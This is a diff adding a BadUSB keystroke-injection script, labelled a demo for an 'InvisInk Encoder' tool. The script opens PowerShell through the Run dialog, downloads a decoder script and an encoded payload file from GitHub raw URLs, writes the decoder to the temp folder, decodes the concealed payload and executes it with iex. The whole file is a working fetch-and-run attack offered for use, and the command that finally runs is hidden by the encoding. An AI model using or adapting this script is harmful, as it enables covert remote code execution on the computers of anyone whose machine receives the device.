@@ -1,0 +1,14 @@
+REM Title      : REDDs InvisInk Encoder Demo Payload.
+REM Description: Demo BadUSB payload for InvisInk Encoder.
+REM Author     : InfoSecREDD
+REM Version    : 1.0.1
+DELAY 2000
+GUI r
+DELAY 200
+STRING powershell
+DELAY 500
+ENTER
+DELAY 500
+STRING $scriptURL = "https://raw.githubusercontent.com/InfoSecREDD/InvisInk-Encoder/main/IIDecode.ps1"; $fileURL = "https://raw.githubusercontent.com/InfoSecREDD/InvisInk-Encoder/main/invpayload.txt";$fileContent = (iwr -UseBasicParsing -Uri $fileURL).Content;irm $scriptURL -OutFile "$env:TEMP\i.ps1"; $INV = & "$env:TEMP\i.ps1" -Str $fileContent;iex "$INV"
+DELAY 1000
+ENTER
